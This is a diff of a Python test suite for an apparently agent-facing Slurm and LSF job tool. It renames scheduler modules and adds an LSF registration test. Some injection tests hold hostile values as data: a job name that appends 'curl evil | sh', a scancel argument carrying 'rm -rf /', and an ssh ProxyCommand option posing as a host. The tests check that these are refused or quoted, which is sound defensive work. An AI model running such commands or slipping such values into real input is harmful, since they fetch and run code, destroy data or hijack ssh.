@@ -19,8 +19,8 @@ from mimir.servers.hpc import node_profiles as hpc_node_profiles
 from mimir.servers.hpc import jobs as hpc_jobs
 from mimir.servers.hpc import cli as hpc_cli
 from mimir.servers.hpc import slurm_digest
-from mimir.shared import shell_activity, slurm_site
-from mimir.shared.slurm_site import UNKNOWN_JOB, SlurmJobState
+from mimir.shared import shell_activity, cluster_site
+from mimir.shared.schedulers import UNKNOWN_JOB, JobState
 
 from mimir.tests.support.scheduler import local_slurm, reads_through_stubs
 
@@ -168,7 +168,7 @@ class SbatchSubmitTests(unittest.TestCase):
         # here shells out to a real scheduler and waits out its timeout.
         stub_attr(self, hpc_jobs, "slurm_queued_by_host", lambda *_a, **_k: {"": []})
         # One scheduler, this machine's own, so resolution has nothing to refuse and
-        # the real slurm_site.resolve_host is what runs. Forced rather than mocked: the
+        # the real cluster_site.resolve_host is what runs. Forced rather than mocked: the
         # probe is a fact about the developer's machine, which a test may not inherit.
         local_slurm(self)
         # Everything a submission runs goes through _run_bash now — the submit itself
@@ -228,14 +228,14 @@ class SbatchSubmitTests(unittest.TestCase):
         """A Slurm job outlives its conversation; filing it per session must not hide it."""
         with patch.dict(os.environ, {"MIMIR_SESSION_ID": "session-a"}):
             submitted = self._submit()["job_dir"]
-        stub_attr(self, hpc_jobs, "normalized_job_state", lambda jid, *, host="": SlurmJobState("running", "RUNNING", ["gpu007"]))
+        stub_attr(self, hpc_jobs, "normalized_job_state", lambda jid, *, host="": JobState("running", "RUNNING", ["gpu007"]))
         with patch.dict(os.environ, {"MIMIR_SESSION_ID": "session-b"}):
             status = server_hpc.slurm_job_status(job_id="4242")
         self.assertEqual(status["job_dir"], submitted)
         self.assertEqual(status["submitted_by_another_session"], "session-a")
 
     def test_a_job_of_this_session_is_not_labelled_as_another_s(self) -> None:
-        stub_attr(self, hpc_jobs, "normalized_job_state", lambda jid, *, host="": SlurmJobState("running", "RUNNING", ["gpu007"]))
+        stub_attr(self, hpc_jobs, "normalized_job_state", lambda jid, *, host="": JobState("running", "RUNNING", ["gpu007"]))
         with patch.dict(os.environ, {"MIMIR_SESSION_ID": "session-a"}):
             submitted = self._submit()["job_dir"]
             status = server_hpc.slurm_job_status(job_id="4242")
@@ -243,7 +243,7 @@ class SbatchSubmitTests(unittest.TestCase):
         self.assertNotIn("submitted_by_another_session", status)
 
     def _status_as(self, state: str, job_id: str = "4242") -> dict:
-        stub_attr(self, hpc_jobs, "normalized_job_state", lambda jid, *, host="": SlurmJobState(state, state.upper(),
+        stub_attr(self, hpc_jobs, "normalized_job_state", lambda jid, *, host="": JobState(state, state.upper(),
                                      ["gpu007"] if state == "running" else []))
         return server_hpc.slurm_job_status(job_id=job_id)
 
@@ -545,7 +545,7 @@ class PartitionAndQueueAccessTests(unittest.TestCase):
                        else "1|me|RUNNING|1:00|2:00|1|n1|a\n" if cmd.startswith("squeue")
                        else "cpu*|up|1-00|4|idle|64|773500\n"
                             "gpu|up|1-00|1|mix|72|579000\n")})
-        stub_attr(self, slurm_site, "recorded_jobs", lambda: set())
+        stub_attr(self, cluster_site, "recorded_jobs", lambda: set())
 
     def test_partitions_are_the_usable_ones_with_what_waits_on_them(self) -> None:
         stub_digest(self, partitions=["cpu"], left_out={"gpu": "not open to your accounts"})
@@ -921,7 +921,7 @@ class SlurmCancelTests(unittest.TestCase):
                 **files: str) -> None:
         """File *job_id* as submitted by *session* on *host*, as a submission does."""
         with patch.dict(os.environ, {"MIMIR_SESSION_ID": session}):
-            slurm_site.record_job_dir(job_id, **{slurm_site.HOST_FILE: host, **files})
+            cluster_site.record_job_dir(job_id, **{cluster_site.HOST_FILE: host, **files})
 
     def _cancels(self) -> list[list[str]]:
         return [a for a in self.argvs if a[0] == "scancel"]
@@ -989,7 +989,7 @@ class SlurmCancelTests(unittest.TestCase):
 
     def test_a_job_without_a_recorded_scheduler_is_refused(self) -> None:
         with patch.dict(os.environ, {"MIMIR_SESSION_ID": "s-a"}):
-            slurm_site.record_job_dir("6000")
+            cluster_site.record_job_dir("6000")
         self._refused("6000")
 
     def test_a_parent_cancels_its_sub_agents_job(self) -> None:
@@ -1070,7 +1070,7 @@ class WhereAJobsOutputGoesTests(unittest.TestCase):
         # here shells out to a real scheduler and waits out its timeout.
         stub_attr(self, hpc_jobs, "slurm_queued_by_host", lambda *_a, **_k: {"": []})
         # One scheduler, this machine's own, so resolution has nothing to refuse and
-        # the real slurm_site.resolve_host is what runs. Forced rather than mocked: the
+        # the real cluster_site.resolve_host is what runs. Forced rather than mocked: the
         # probe is a fact about the developer's machine, which a test may not inherit.
         local_slurm(self)
         self.piped: list[str] = []
@@ -1165,17 +1165,17 @@ class WhereAJobsOutputGoesTests(unittest.TestCase):
 
 class HowACommandReachesItsSchedulerTests(unittest.TestCase):
     """Running a command where Slurm is: locally or over ``ssh``, through
-    ``shared/slurm_site``. Which scheduler a call goes to is resolved by the caller.
+    ``shared/cluster_site``. Which scheduler a call goes to is resolved by the caller.
     """
 
     def test_local_is_run_through_a_login_shell(self) -> None:
         # The login shell is what puts the scheduler's own module files on PATH — the
         # difference between squeue and "command not found" on most sites.
-        self.assertEqual(slurm_site.argv_for("squeue -h"),
+        self.assertEqual(cluster_site.argv_for("squeue -h"),
                          ["bash", "-lc", "squeue -h"])
 
     def test_a_named_host_is_reached_over_ssh(self) -> None:
-        argv = slurm_site.argv_for("squeue -u $USER", host="host-a")
+        argv = cluster_site.argv_for("squeue -u $USER", host="host-a")
         self.assertEqual(argv[0], "ssh")
         self.assertIn("host-a", argv)
         # A poller that can be asked for a password hangs for the timeout on every
@@ -1189,7 +1189,7 @@ class HowACommandReachesItsSchedulerTests(unittest.TestCase):
     def test_a_piped_call_keeps_its_stdin(self) -> None:
         # ``-n`` closes stdin, which is right for every call but the one whose stdin
         # is the point: a submission hands sbatch its script that way.
-        argv = slurm_site.argv_for("sbatch", host="host-a", piped=True)
+        argv = cluster_site.argv_for("sbatch", host="host-a", piped=True)
         self.assertNotIn("-n", argv)
         self.assertIn("BatchMode=yes", argv)
 
@@ -1197,7 +1197,7 @@ class HowACommandReachesItsSchedulerTests(unittest.TestCase):
         # An identity file, a port, a jump host are ~/.ssh/config's business — a
         # configuration mechanism the user already has, and one we have no business
         # duplicating with a setting of our own.
-        argv = slurm_site.argv_for("squeue", host="host-a")
+        argv = cluster_site.argv_for("squeue", host="host-a")
         self.assertEqual([a for a in argv if a == "-o"], ["-o", "-o"])
         self.assertEqual(argv.count("host-a"), 1)
 
@@ -1207,21 +1207,21 @@ class HowACommandReachesItsSchedulerTests(unittest.TestCase):
         # ssh's options before the host in any case.
         for bad in ("-oProxyCommand=touch /tmp/x", "-F/tmp/cfg", "host a", "a\nb", ""):
             with self.subTest(bad=bad):
-                self.assertFalse(slurm_site.valid_host(bad))
-        with self.assertRaises(slurm_site.InvalidHost):
-            slurm_site.argv_for("squeue", host="-oProxyCommand=touch /tmp/x")
-        argv = slurm_site.argv_for("squeue", host="user@host-a.example")
+                self.assertFalse(cluster_site.valid_host(bad))
+        with self.assertRaises(cluster_site.InvalidHost):
+            cluster_site.argv_for("squeue", host="-oProxyCommand=touch /tmp/x")
+        argv = cluster_site.argv_for("squeue", host="user@host-a.example")
         self.assertEqual(argv[argv.index("--") + 1], "user@host-a.example")
 
     def test_a_line_break_cannot_add_a_line_to_the_job_script(self) -> None:
-        from mimir.shared.slurm_script import sbatch_header
+        from mimir.shared.job_script import sbatch_header
         with self.assertRaises(ValueError):
             sbatch_header(job_name="x\ncurl evil | sh", partition="cpu", cpus_per_task=1,
                           wall_time="00:10:00", log_file="/w/log")
 
     def test_a_scheduler_shaped_as_an_option_is_refused_by_the_tools(self) -> None:
         bad = "-oProxyCommand=touch /tmp/x"
-        host, refusal = slurm_site.resolve_host(bad)
+        host, refusal = cluster_site.resolve_host(bad)
         self.assertEqual(host, "")
         self.assertIn("cannot start with", refusal)
         self.assertEqual(server_hpc.slurm_schedulers(add=bad)["status"], "error")
@@ -1253,7 +1253,7 @@ class HowACommandReachesItsSchedulerTests(unittest.TestCase):
         # The property the submitters are written for: they take their resources as
         # arguments and build the command themselves, so no shell is involved and no
         # argument can become a second command.
-        self.assertEqual(slurm_site.exec_argv(["scancel", "1; rm -rf /"]),
+        self.assertEqual(cluster_site.exec_argv(["scancel", "1; rm -rf /"]),
                          ["scancel", "1; rm -rf /"])
 
     def test_an_argv_keeps_its_arguments_whole_over_ssh(self) -> None:
@@ -1263,7 +1263,7 @@ class HowACommandReachesItsSchedulerTests(unittest.TestCase):
         parse — so each element is quoted on the way out, and what the remote shell
         splits is exactly the argv built here.
         """
-        argv = slurm_site.exec_argv(["scancel", "1; rm -rf /"], host="host-a")
+        argv = cluster_site.exec_argv(["scancel", "1; rm -rf /"], host="host-a")
         self.assertEqual(argv[0], "ssh")
         self.assertEqual(argv[-1], shlex.quote("scancel '1; rm -rf /'"))
 
@@ -1339,7 +1339,7 @@ class ManySchedulersOneSessionTests(unittest.TestCase):
         local_slurm(self, "" in hosts)
         for host in hosts:
             if host:
-                slurm_site.record_host(host)
+                cluster_site.record_host(host)
 
     def _answers(self, knows: dict[str, str]) -> list[tuple[str, str]]:
         """Let only the named hosts know a job, and record who was asked.
@@ -1356,7 +1356,9 @@ class ManySchedulersOneSessionTests(unittest.TestCase):
             if "squeue" in script:
                 return {"status": "ok", "stdout": state, "stderr": "",
                         "returncode": 0}
-            return {"status": "ok", "stdout": "", "stderr": "", "returncode": 0}
+            # The registration probe names the scheduler it found.
+            out = "slurm\n" if script.startswith("command -v sbatch") else ""
+            return {"status": "ok", "stdout": out, "stderr": "", "returncode": 0}
 
         stub_attr(self, hpc_cli, "run_bash", fake)
         return asked
@@ -1474,23 +1476,33 @@ class ManySchedulersOneSessionTests(unittest.TestCase):
             "returncode": 255})
         res = server_hpc.slurm_schedulers(add="unreachable-host")
         self.assertEqual(res["status"], "error")
-        self.assertNotIn("unreachable-host", slurm_site.hosts())
+        self.assertNotIn("unreachable-host", cluster_site.hosts())
 
     def test_a_host_that_answers_is_added_and_can_be_dropped(self) -> None:
         self._reaching("")
         self._answers({})
         added = server_hpc.slurm_schedulers(add="host-b")
-        self.assertIn("host-b", slurm_site.hosts())
+        self.assertIn("host-b", cluster_site.hosts())
         self.assertIn("added", added["added"]["note"])
         dropped = server_hpc.slurm_schedulers(forget="host-b")
-        self.assertNotIn("host-b", slurm_site.hosts())
+        self.assertNotIn("host-b", cluster_site.hosts())
         self.assertIn("dropped", dropped["dropped"]["note"])
+
+    def test_an_lsf_host_is_added_as_lsf(self) -> None:
+        """The probe says which scheduler answers, and the registry keeps it."""
+        self._reaching("")
+        stub_attr(self, hpc_cli, "run_bash", lambda script, timeout, stdin=None, *, host="": {
+            "status": "ok", "stdout": "lsf\n", "stderr": "", "returncode": 0})
+        added = server_hpc.slurm_schedulers(add="lsf-login")
+        self.assertEqual(added["added"]["kind"], "lsf")
+        self.assertEqual(cluster_site.kind_of("lsf-login"), "lsf")
+        self.assertIn("bsub answers", added["added"]["note"])
 
     def test_the_local_scheduler_is_not_a_record_to_drop(self) -> None:
         self._reaching("")
         res = server_hpc.slurm_schedulers(forget="local")
         self.assertIn("not a record", res["dropped"]["note"])
-        self.assertEqual(slurm_site.hosts(), [""])
+        self.assertEqual(cluster_site.hosts(), [""])
 
 
 class TheQueueSaysWhatIsWatchedTests(unittest.TestCase):
@@ -1602,7 +1614,7 @@ class SlurmWatchTests(unittest.TestCase):
         # here shells out to a real scheduler and waits out its timeout.
         stub_attr(self, hpc_jobs, "slurm_queued_by_host", lambda *_a, **_k: {"": []})
         # One scheduler, this machine's own, so resolution has nothing to refuse and
-        # the real slurm_site.resolve_host is what runs. Forced rather than mocked: the
+        # the real cluster_site.resolve_host is what runs. Forced rather than mocked: the
         # probe is a fact about the developer's machine, which a test may not inherit.
         local_slurm(self)
         self._tmp = tempfile.TemporaryDirectory()
